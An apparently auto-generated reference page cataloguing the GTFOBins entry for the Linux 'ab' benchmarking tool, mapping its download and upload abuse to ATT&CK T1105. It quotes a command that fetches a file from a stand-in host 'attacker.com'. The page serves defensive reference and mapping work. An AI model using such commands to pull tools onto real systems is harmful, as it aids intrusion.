---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# ab

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `ab` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ab` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for ab covering download, upload.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/ab.md)
- Source verification: [source record](../../sources/gtfobins/ab.md)

## Aliases

- `ab`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: ab -v2 http://attacker.com/path/to/input-file |

## Source Verification

[source record](../../sources/gtfobins/ab.md)

## Evidence Excerpt

```text
_body: ''
_name: ab
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ab
functions:
download:
- code: ab -v2 http://attacker.com/path/to/input-file
contexts:
sudo: null
```
